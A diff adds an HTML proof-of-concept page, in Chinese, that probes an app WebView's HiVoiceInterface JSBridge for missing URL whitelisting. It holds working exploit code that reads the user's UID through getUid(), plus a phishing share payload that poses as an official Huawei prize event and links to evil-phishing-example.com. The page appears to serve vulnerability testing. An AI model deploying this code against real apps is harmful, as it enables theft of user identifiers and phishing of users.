@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HiVoiceInterface JSBridge 探测</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #f5f5f5;
+      padding: 16px;
+      min-height: 100vh;
+    }
+    h1 {
+      color: #2c3e50;
+      font-size: 20px;
+      margin-bottom: 12px;
+      border-bottom: 3px solid #3498db;
+      padding-bottom: 8px;
+    }
+    .status-bar {
+      background: #fff;
+      border-radius: 8px;
+      padding: 12px 16px;
+      margin-bottom: 16px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    }
+    .status-item {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 8px;
+      font-size: 14px;
+    }
+    .status-item:last-child { margin-bottom: 0; }
+    .status-dot {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      flex-shrink: 0;
+    }
+    .dot-found { background: #27ae60; }
+    .dot-not-found { background: #e74c3c; }
+    .dot-testing { background: #f39c12; }
+    .url-text {
+      color: #e74c3c;
+      font-weight: bold;
+      font-size: 12px;
+      word-break: break-all;
+    }
+    .method-card {
+      background: #fff;
+      border-radius: 8px;
+      padding: 16px;
+      margin-bottom: 12px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    }
+    .method-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 12px;
+    }
+    .method-name {
+      font-size: 16px;
+      font-weight: bold;
+      color: #2c3e50;
+    }
+    .method-tag {
+      font-size: 11px;
+      padding: 3px 8px;
+      border-radius: 4px;
+      background: #fde2e2;
+      color: #c0392b;
+      font-weight: bold;
+    }
+    .method-desc {
+      font-size: 13px;
+      color: #666;
+      margin-bottom: 12px;
+      line-height: 1.5;
+    }
+    .btn-group {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      margin-bottom: 12px;
+    }
+    button {
+      font-size: 14px;
+      padding: 10px 16px;
+      border-radius: 6px;
+      border: none;
+      color: #fff;
+      cursor: pointer;
+      font-weight: 500;
+      transition: opacity 0.2s;
+    }
+    button:active { opacity: 0.7; }
+    .btn-danger { background: #e74c3c; }
+    .btn-warning { background: #f39c12; }
+    .btn-info { background: #3498db; }
+    .btn-success { background: #27ae60; }
+    .result-box {
+      background: #1a1a2e;
+      color: #0f0;
+      font-family: 'Courier New', monospace;
+      font-size: 12px;
+      padding: 12px;
+      border-radius: 6px;
+      min-height: 60px;
+      max-height: 200px;
+      overflow-y: auto;
+      white-space: pre-wrap;
+      word-break: break-all;
+    }
+    .result-label {
+      font-size: 12px;
+      color: #888;
+      margin-bottom: 4px;
+    }
+    .risk-warning {
+      background: #fdeaea;
+      border-left: 4px solid #e74c3c;
+      padding: 10px 14px;
+      margin-bottom: 16px;
+      font-size: 13px;
+      color: #7d1a1a;
+      border-radius: 4px;
+    }
+    .risk-warning b { color: #c0392b; }
+  </style>
+</head>
+<body>
+
+<h1>HiVoiceInterface JSBridge 探测</h1>
+
+<div class="risk-warning">
+  <b>风险提示:</b> HiVoiceInterface 注册时<b>未传 methodsPermission 参数</b>(只传3个参数)，
+  任何URL的H5页面都能调用这4个方法，无框架层URL白名单保护。
+  其中 <b>getUid()</b> 直接返回用户UID(敏感数据)。
+</div>
+
+<div class="status-bar">
+  <div class="status-item">
+    <div class="status-dot" id="statusDot"></div>
+    <span id="statusText">检测中...</span>
+  </div>
+  <div class="status-item">
+    <span style="color:#888; font-size:12px;">当前URL:</span>
+    <span class="url-text" id="currentUrl"></span>
+  </div>
+</div>
+
+<!-- getUid -->
+<div class="method-card">
+  <div class="method-header">
+    <span class="method-name">getUid()</span>
+    <span class="method-tag">无校验 · 敏感数据</span>
+  </div>
+  <div class="method-desc">
+    直接返回用户 UID 字符串。无任何白名单校验，任意 H5 页面可调用获取用户标识。
+  </div>
+  <div class="btn-group">
+    <button class="btn-danger" onclick="testGetUid()">获取用户 UID</button>
+  </div>
+  <div class="result-label">调用结果:</div>
+  <div class="result-box" id="result-getUid">等待调用...</div>
+</div>
+
+<!-- shareH5 -->
+<div class="method-card">
+  <div class="method-header">
+    <span class="method-name">shareH5(shareInfoStr)</span>
+    <span class="method-tag">无校验</span>
+  </div>
+  <div class="method-desc">
+    接收 JSON 字符串，解析为 ShareInfo 对象(sharedWord/sharedH5LinkUrl/sharedTitle/sharedContent/sharedPic)，
+    触发分享流程并加载图片 URL。可注入任意分享内容。
+  </div>
+  <div class="btn-group">
+    <button class="btn-warning" onclick="testShareH5()">分享(自定义内容)</button>
+    <button class="btn-warning" onclick="testShareH5Phishing()">分享(钓鱼链接)</button>
+  </div>
+  <div class="result-label">调用结果:</div>
+  <div class="result-box" id="result-shareH5">等待调用...</div>
+</div>
+
+<!-- closeH5 -->
+<div class="method-card">
+  <div class="method-header">
+    <span class="method-name">closeH5()</span>
+    <span class="method-tag">无校验</span>
+  </div>
+  <div class="method-desc">
+    关闭当前 Web 页面 (NavigationUtils.pop)。任意 H5 可强制关闭页面。
+  </div>
+  <div class="btn-group">
+    <button class="btn-info" onclick="testCloseH5()">关闭 H5 页面</button>
+  </div>
+  <div class="result-label">调用结果:</div>
+  <div class="result-box" id="result-closeH5">等待调用...</div>
+</div>
+
+<!-- shareH5ToRubikCube -->
+<div class="method-card">
+  <div class="method-header">
+    <span class="method-name">shareH5ToRubikCube()</span>
+    <span class="method-tag">无校验</span>
+  </div>
+  <div class="method-desc">
+    触发分享数据到魔方 (shareData)，返回 boolean。需先调用 shareH5 设置分享内容。
+  </div>
+  <div class="btn-group">
+    <button class="btn-success" onclick="testShareToRubikCube()">分享到魔方</button>
+  </div>
+  <div class="result-label">调用结果:</div>
+  <div class="result-box" id="result-shareH5ToRubikCube">等待调用...</div>
+</div>
+
+<script>
+// 显示当前URL
+document.getElementById('currentUrl').textContent = window.location.href;
+
+// 页面加载时自动探测 HiVoiceInterface
+window.onload = function() {
+  probeHiVoiceInterface();
+};
+
+function probeHiVoiceInterface() {
+  var dot = document.getElementById('statusDot');
+  var text = document.getElementById('statusText');
+
+  if (window.HiVoiceInterface) {
+    dot.className = 'status-dot dot-found';
+    text.innerHTML = '<b style="color:#27ae60;">HiVoiceInterface 已找到!</b> 4个方法可调用';
+
+    // 探测方法
+    var methods = ['shareH5', 'closeH5', 'getUid', 'shareH5ToRubikCube'];
+    var foundMethods = [];
+    for (var i = 0; i < methods.length; i++) {
+      if (typeof window.HiVoiceInterface[methods[i]] === 'function') {
+        foundMethods.push(methods[i]);
+      }
+    }
+    if (foundMethods.length > 0) {
+      text.innerHTML += '<br><span style="font-size:12px; color:#666;">可用方法: ' + foundMethods.join(', ') + '</span>';
+    }
+  } else {
+    dot.className = 'status-dot dot-not-found';
+    text.innerHTML = '<b style="color:#e74c3c;">HiVoiceInterface 未找到</b>';
+  }
+}
+
+// ============================================================
+//  getUid() - 获取用户UID
+// ============================================================
+function testGetUid() {
+  var resultBox = document.getElementById('result-getUid');
+  resultBox.textContent = '调用中...';
+
+  if (!window.HiVoiceInterface) {
+    resultBox.textContent = '[ERROR] HiVoiceInterface 对象不存在';
+    return;
+  }
+
+  if (typeof window.HiVoiceInterface.getUid !== 'function') {
+    resultBox.textContent = '[ERROR] getUid 方法不存在或不是函数';
+    return;
+  }
+
+  try {
+    var startTime = Date.now();
+    var result = window.HiVoiceInterface.getUid();
+    var elapsed = Date.now() - startTime;
+
+    resultBox.textContent = '[SUCCESS] 调用耗时: ' + elapsed + 'ms\n\n';
+    resultBox.textContent += '返回值类型: ' + typeof result + '\n';
+    resultBox.textContent += '返回值: ' + JSON.stringify(result) + '\n';
+
+    if (result && result.length > 0) {
+      resultBox.textContent += '\n[!] 敏感数据泄露: 用户UID已获取';
+    }
+  } catch(e) {
+    resultBox.textContent = '[EXCEPTION] ' + e.message;
+  }
+}
+
+// ============================================================
+//  shareH5(shareInfoStr) - 分享H5
+// ============================================================
+function testShareH5() {
+  var resultBox = document.getElementById('result-shareH5');
+  resultBox.textContent = '调用中...';
+
+  if (!window.HiVoiceInterface) {
+    resultBox.textContent = '[ERROR] HiVoiceInterface 对象不存在';
+    return;
+  }
+
+  if (typeof window.HiVoiceInterface.shareH5 !== 'function') {
+    resultBox.textContent = '[ERROR] shareH5 方法不存在或不是函数';
+    return;
+  }
+
+  try {
+    var shareInfo = {
+      sharedWord: 'JSBridge分享测试',
+      sharedH5LinkUrl: 'https://www.baidu.com',
+      sharedTitle: '测试标题',
+      sharedContent: '测试内容',
+      sharedPic: ''
+    };
+    var shareInfoStr = JSON.stringify(shareInfo);
+
+    var startTime = Date.now();
+    var result = window.HiVoiceInterface.shareH5(shareInfoStr);
+    var elapsed = Date.now() - startTime;
+
+    resultBox.textContent = '[SUCCESS] 调用耗时: ' + elapsed + 'ms\n\n';
+    resultBox.textContent += '传入参数:\n' + JSON.stringify(shareInfo, null, 2) + '\n\n';
+    resultBox.textContent += '返回值: ' + (result === undefined ? 'undefined (void)' : JSON.stringify(result));
+  } catch(e) {
+    resultBox.textContent = '[EXCEPTION] ' + e.message;
+  }
+}
+
+function testShareH5Phishing() {
+  var resultBox = document.getElementById('result-shareH5');
+  resultBox.textContent = '调用中...';
+
+  if (!window.HiVoiceInterface) {
+    resultBox.textContent = '[ERROR] HiVoiceInterface 对象不存在';
+    return;
+  }
+
+  if (typeof window.HiVoiceInterface.shareH5 !== 'function') {
+    resultBox.textContent = '[ERROR] shareH5 方法不存在或不是函数';
+    return;
+  }
+
+  try {
+    var shareInfo = {
+      sharedWord: '免费领取奖品',
+      sharedH5LinkUrl: 'https://evil-phishing-example.com/gift',
+      sharedTitle: '华为官方活动',
+      sharedContent: '点击领取你的奖品',
+      sharedPic: 'https://www.baidu.com/img/PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png'
+    };
+    var shareInfoStr = JSON.stringify(shareInfo);
+
+    var startTime = Date.now();
+    var result = window.HiVoiceInterface.shareH5(shareInfoStr);
+    var elapsed = Date.now() - startTime;
+
+    resultBox.textContent = '[SUCCESS] 钓鱼链接注入成功! 调用耗时: ' + elapsed + 'ms\n\n';
+    resultBox.textContent += '注入的钓鱼参数:\n' + JSON.stringify(shareInfo, null, 2) + '\n\n';
+    resultBox.textContent += '返回值: ' + (result === undefined ? 'undefined (void)' : JSON.stringify(result));
+  } catch(e) {
+    resultBox.textContent = '[EXCEPTION] ' + e.message;
+  }
+}
+
+// ============================================================
+//  closeH5() - 关闭H5页面
+// ============================================================
+function testCloseH5() {
+  var resultBox = document.getElementById('result-closeH5');
+  resultBox.textContent = '调用中...';
+
+  if (!window.HiVoiceInterface) {
+    resultBox.textContent = '[ERROR] HiVoiceInterface 对象不存在';
+    return;
+  }
+
+  if (typeof window.HiVoiceInterface.closeH5 !== 'function') {
+    resultBox.textContent = '[ERROR] closeH5 方法不存在或不是函数';
+    return;
+  }
+
+  try {
+    var startTime = Date.now();
+    var result = window.HiVoiceInterface.closeH5();
+    var elapsed = Date.now() - startTime;
+
+    resultBox.textContent = '[SUCCESS] 调用耗时: ' + elapsed + 'ms\n\n';
+    resultBox.textContent += '页面即将关闭 (NavigationUtils.pop)\n';
+    resultBox.textContent += '返回值: ' + (result === undefined ? 'undefined (void)' : JSON.stringify(result));
+  } catch(e) {
+    resultBox.textContent = '[EXCEPTION] ' + e.message;
+  }
+}
+
+// ============================================================
+//  shareH5ToRubikCube() - 分享到魔方
+// ============================================================
+function testShareToRubikCube() {
+  var resultBox = document.getElementById('result-shareH5ToRubikCube');
+  resultBox.textContent = '调用中...';
+
+  if (!window.HiVoiceInterface) {
+    resultBox.textContent = '[ERROR] HiVoiceInterface 对象不存在';
+    return;
+  }
+
+  if (typeof window.HiVoiceInterface.shareH5ToRubikCube !== 'function') {
+    resultBox.textContent = '[ERROR] shareH5ToRubikCube 方法不存在或不是函数';
+    return;
+  }
+
+  try {
+    var startTime = Date.now();
+    var result = window.HiVoiceInterface.shareH5ToRubikCube();
+    var elapsed = Date.now() - startTime;
+
+    resultBox.textContent = '[SUCCESS] 调用耗时: ' + elapsed + 'ms\n\n';
+    resultBox.textContent += '返回值类型: ' + typeof result + '\n';
+    resultBox.textContent += '返回值: ' + JSON.stringify(result) + '\n';
+
+    if (result === true) {
+      resultBox.textContent += '\n[!] 分享数据已触发到魔方';
+    }
+  } catch(e) {
+    resultBox.textContent = '[EXCEPTION] ' + e.message;
+  }
+}
+</script>
+
+</body>
+</html>
